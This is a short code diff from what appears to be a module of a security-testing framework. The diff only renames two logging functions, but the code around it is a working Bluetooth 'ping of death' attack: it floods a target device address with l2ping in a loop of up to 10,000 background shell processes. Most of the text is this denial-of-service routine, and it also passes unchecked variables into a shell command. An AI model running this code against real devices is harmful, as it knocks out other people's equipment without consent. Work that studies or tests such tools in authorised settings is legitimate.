@@ -37,14 +37,14 @@ customcommands = {
 changelog = "Version 1.0:\nrelease"
 
 def run():
-    printInfo("bluetooth ping of death attack started...")
+    print_info("bluetooth ping of death attack started...")
     try:
         for i in range(1, 10000):
             xterm_1 = "l2ping -i %s -s %s -f %s &" % (variables['interface'][0], variables['size'][0], variables['bdaddr'][0])
             subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
             time.sleep(3)
     except(OSError):
-        printError("something went wrong!")
+        print_error("something went wrong!")
 
 
 def scan(args):
